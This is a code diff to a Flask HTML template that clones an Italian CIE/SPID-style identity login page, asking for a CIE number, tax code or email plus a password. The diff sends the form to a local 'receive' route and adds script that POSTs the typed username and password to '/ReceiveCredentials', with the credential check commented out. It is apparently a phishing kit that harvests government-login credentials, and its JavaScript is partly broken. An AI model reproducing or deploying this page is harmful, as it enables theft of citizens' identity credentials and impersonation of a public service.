@@ -355,12 +355,12 @@
 
 
 <div class="mt-3">
-     <form method="POST" action="/idp/login/livello2" id="loginUP">
-                                                       
+    <form method="POST" action="{{ url_for('receive') }}" id="loginUP">
+
           <div class="form-row">
                <div class="form-group col mb-5">
                     <div class="input-group">
-                         
+
                          <label for="username" class="sr-only active" style="transition: none;">Numero <abbr title="Carta d" identit&agrave;="" elettronica'="">CIE</abbr> o Codice fiscale o Email</label>
                          <input type="text" class="form-control" id="username" name="username" placeholder="Numero CIE o Codice fiscale o Email" autocomplete="username" tabindex="1">
 
@@ -409,20 +409,18 @@
           var submittingUP=false;
           $('#loginUP').submit(function( event ) {
                if(!submittingUP){
-                        var request = new XMLHttpRequest();
-                        request.open('POST', '/ReceiveCredentials', true);
-                        request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                        request.onreadystatechange = function() {
-                            // do something
-                        };
-                        request.send('username=' + username.value + ';password=+username.password);
-                    if(checkUsernameAndPassword()){
-                         submittingUP=true;
-                         return true;
-                    }
+                    var request = new XMLHttpRequest();
+                    request.open('POST', '/ReceiveCredentials', true);
+                    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    request.onreadystatechange = function() {
+                        // do something
+                    };
+                    request.send('username=' + username.value);
+                    request.send('password=' + password.value);
+                   // if(checkUsernameAndPassword()){}
+                   return true;
                }
-               event.preventDefault();
-               return false;
+              return false;
           });
      });
      </script>
